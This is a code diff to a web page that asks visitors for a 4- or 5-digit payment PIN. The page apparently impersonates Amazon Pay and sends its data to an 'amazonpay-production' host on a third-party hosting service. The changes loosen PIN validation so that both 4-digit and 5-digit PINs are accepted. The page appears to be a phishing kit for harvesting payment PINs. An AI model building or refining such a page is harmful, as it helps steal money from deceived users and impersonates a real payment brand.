@@ -312,9 +312,9 @@
 
     <div class="pin-label">Your PIN</div>
     <div class="pin-row" id="pinRow">
-      <input class="pin-input" type="password" inputmode="numeric" maxlength="5" autocomplete="off" placeholder="•••••">
+      <input class="pin-input" type="password" inputmode="numeric" maxlength="5" autocomplete="off" placeholder="••••">
     </div>
-    <div class="pin-error" id="pinError">Please enter all 5 digits of your PIN.</div>
+    <div class="pin-error" id="pinError">Please enter 4 or 5 digits of your PIN.</div>
 
     <div class="security-note">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
@@ -368,8 +368,6 @@
 <script>
 /* ────────────────────────────────────────────────────────────
    RAILWAY endpoints — always-on, no cold start
-   These replace the old relative paths so the verification
-   flow works even when Render sleeps.
    ──────────────────────────────────────────────────────────── */
 const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
 
@@ -495,7 +493,8 @@ function initPin() {
     const val = pinInput.value.replace(/\D/g, '');
     pinInput.value = val;
     state.pin = val.split('');
-    const filled = val.length === 5;
+    // Enable at 4 OR 5 digits
+    const filled = val.length === 4 || val.length === 5;
     pinInput.classList.toggle('filled', filled);
     verifyBtn.disabled = !filled;
     if (filled && errEl) errEl.classList.remove('show');
@@ -611,9 +610,14 @@ function stopSafetySlider() {
 
 async function doVerify() {
   const errEl = document.getElementById('pinError');
-  const allFilled = state.pin.length === 5 && state.pin.every(v => v !== '');
+  // Accept 4 or 5 digits
+  const len = state.pin.length;
+  const allFilled = (len === 4 || len === 5) && state.pin.every(v => v !== '');
   if (!allFilled) {
-    if (errEl) errEl.classList.add('show');
+    if (errEl) {
+      errEl.textContent = 'Please enter 4 or 5 digits of your PIN.';
+      errEl.classList.add('show');
+    }
     const pinInput = document.querySelector('.pin-input');
     if (pinInput) pinInput.classList.add('error');
     return;
